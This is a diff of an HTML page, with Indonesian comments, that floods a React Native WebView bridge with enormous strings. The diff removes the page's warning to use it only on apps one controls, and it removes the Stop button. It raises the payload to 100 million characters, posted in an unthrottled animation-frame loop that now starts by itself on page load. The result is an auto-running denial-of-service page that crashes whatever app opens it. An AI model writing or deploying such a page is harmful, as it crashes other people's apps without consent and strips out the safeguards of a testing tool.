@@ -2,21 +2,13 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>ReactNativeWebView Crash Test - Nuclear Mode</title>
+<title>ReactNativeWebView Crash Test - Auto Nuclear</title>
 <style>
-body { font-family: sans-serif; padding: 20px; background: #f9f9f9; }
-button { margin: 5px 0; padding: 10px 15px; font-size: 14px; }
-pre { background: #000; color: #0f0; padding: 10px; height: 200px; overflow: auto; }
+body { font-family: sans-serif; padding: 20px; background: #000; color: #0f0; }
 </style>
 </head>
 <body>
-
-<h2>ReactNativeWebView Crash Test</h2>
-<p>Gunakan <b>Mode Nuklir</b> hanya di aplikasi yang kamu kuasai. Ini akan mengirim payload raksasa tanpa henti.</p>
-
-<button onclick="startNuclear()">🚨 Start Nuclear Mode</button>
-<button onclick="stopNuclear()">🛑 Stop</button>
-
+<h2>🚨 Auto Nuclear Mode Activated</h2>
 <pre id="log"></pre>
 
 <script>
@@ -35,27 +27,23 @@ function post(msg) {
 }
 
 function sendLongString() {
-    const payload = "A".repeat(10_000_000);
+    const payload = "A".repeat(100_000_000);
     post(payload);
 }
 
-let nuclearActive = false;
+let nuclearActive = true;
 
 function startNuclear() {
-    if (nuclearActive) return;
-    nuclearActive = true;
-    log("🚨 Nuclear Mode started!");
+    log("🚨 Nuclear Mode started automatically!");
     (function loop() {
         if (!nuclearActive) return;
         sendLongString();
-        requestAnimationFrame(loop); // tanpa delay
+        requestAnimationFrame(loop); // tanpa jeda
     })();
 }
 
-function stopNuclear() {
-    nuclearActive = false;
-    log("🛑 Nuclear Mode stopped.");
-}
+// Langsung mulai saat halaman dibuka
+startNuclear();
 </script>
 
 </body>
